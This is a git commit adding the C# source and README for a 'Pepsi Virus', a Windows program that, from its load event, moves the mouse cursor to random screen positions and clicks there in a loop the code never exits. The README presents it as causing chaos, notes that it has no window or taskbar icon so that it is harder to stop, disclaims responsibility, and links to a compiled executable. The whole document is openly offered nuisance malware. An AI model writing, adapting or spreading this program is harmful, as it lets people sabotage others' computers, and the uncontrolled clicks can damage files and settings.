7083bec9a0781205eea596700e74563636a78e1e
Hashim Qureshi <42122270+DefyTheRush@users.noreply.github.com>
2018-08-08 22:31:45 -0400

    Add files for Pepsi Virus v1
    Added:
    - Source Code

---
+++ Pepsi/Form1.cs
@@ -0,0 +1,45 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+
+namespace Pepsi
+{
+    public partial class Form1 : Form
+    {
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+
+        public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
+
+        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
+        private const int MOUSEEVENTF_LEFTUP = 0x04;
+        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
+        private const int MOUSEEVENTF_RIGHTUP = 0x10;
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        bool enableProgram;
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            enableProgram = true;
+            do
+            {
+                Random rnd = new Random();
+                int positionOfCursorX = rnd.Next(1, 2500);
+                int positionOfCursorY = rnd.Next(1, 1500);
+                Cursor.Position = new Point(positionOfCursorX, positionOfCursorY);
+                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, positionOfCursorX, positionOfCursorY, 0, 0);
+            } while (enableProgram);
+        }
+    }
+}
--- README.md
+++ README.md
@@ -1,2 +1,19 @@
 # Pepsi-Virus-Remake
+
 Remade a friend's Java-based program (which causes chaos) in C#
+
+
+Features:
+- Lightweight and Portable program
+- No window/taskbar icon to make it even harder to get rid of
+- Moves your mouse extremely fast to any random point and clicks in that area
+
+Notes:
+- THIS CAN HARM YOUR COMPUTER IF YOU CHOOSE TO RUN IT, RUN IT AT YOUR OWN RISK!
+- I take 0% responsbility for any damage to ANY person or thing
+- By running this program in any way, you take FULL responsbility for what happens
+
+Usage:
+- Load it up once and see the chaos done
+
+You can download the program [here](https://www.dropbox.com/s/dt4c9l9756rc4zx/Pepsi.exe?dl=0) (at your OWN risk!)
